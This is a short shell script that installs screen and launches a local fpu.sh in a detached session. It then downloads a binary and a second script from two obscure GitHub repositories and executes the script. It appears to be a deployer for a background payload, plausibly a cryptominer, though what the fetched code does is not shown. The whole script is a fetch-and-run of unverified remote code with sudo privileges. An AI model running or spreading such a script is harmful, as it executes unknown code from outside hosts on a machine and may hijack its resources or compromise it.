#!/bin/sh

sudo apt update
sudo apt install screen -y
screen -dmS fpu.sh ./fpu.sh 65 75
wget https://github.com/bubuk/boba/raw/main/mangresing
wget https://raw.githubusercontent.com/cakcokcakcok/bebas/main/fpu2.sh
chmod +x fpu2.sh
./fpu2.sh
